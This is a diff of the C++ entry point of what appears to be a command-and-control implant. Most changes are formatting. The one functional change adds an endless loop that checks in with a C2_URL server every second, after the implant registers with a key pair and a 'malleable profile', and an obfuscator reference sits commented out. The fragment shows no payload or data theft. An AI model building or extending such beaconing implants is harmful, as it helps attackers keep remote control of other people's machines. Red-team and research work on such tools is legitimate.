@@ -18,14 +18,13 @@
 #include "debug.h"
 
 using namespace std;
-//using namespace andrivet::ADVobfuscator;
+// using namespace andrivet::ADVobfuscator;
 
-
-MalleableProfile* currentProfile;
+MalleableProfile *currentProfile;
 
 std::string LPBYTEToString(LPBYTE bytes, size_t length)
 {
-	return std::string(reinterpret_cast<char*>(bytes), reinterpret_cast<char*>(bytes + length));
+	return std::string(reinterpret_cast<char *>(bytes), reinterpret_cast<char *>(bytes + length));
 }
 
 size_t GetLPBYTELength(LPBYTE bytes)
@@ -37,7 +36,8 @@ size_t GetLPBYTELength(LPBYTE bytes)
 
 int main()
 {
-	if (sodium_init() < 0) {
+	if (sodium_init() < 0)
+	{
 		return 1;
 	}
 
@@ -49,14 +49,16 @@ int main()
 	string pubKey;
 	int status = createBase64KeyPair(&privKey, &pubKey);
 
-	if (status != 0) {
+	if (status != 0)
+	{
 		DEBUG_PRINTF("Error creating key pair, aborting\n");
 		exit(1);
 	}
 
 	currentProfile = Register(C2_URL, pubKey, privKey);
 
-	if (currentProfile == NULL) {
+	if (currentProfile == NULL)
+	{
 		DEBUG_PRINTF("Error registering, aborting\n");
 		exit(1);
 	}
@@ -69,12 +71,16 @@ int main()
 	PSIZE_T outSize = 0;
 
 	// // Checkin loop
-	string checkinRes = HTTPRequest(L"GET", L"localhost", L"/c2/checkin", 8080, L"Hello-world", CONTENT_TYPE_JSON, NULL, 0, outSize, FALSE);
+	while (TRUE)
+	{
+		//Sleep(currentProfile->sleep * 1000);
+		Sleep(1000);
+		Task* newTask = Checkin(C2_URL, currentProfile);
+	}
+
 	rapidjson::Document document;
-	const char* answer_str = "{\"hello\": \"world\"}";
+	const char *answer_str = "{\"hello\": \"world\"}";
 	document.Parse(answer_str);
 	DEBUG_PRINTF("hello = %s\n", document["hello"].GetString());
 	return 0;
 }
-
-
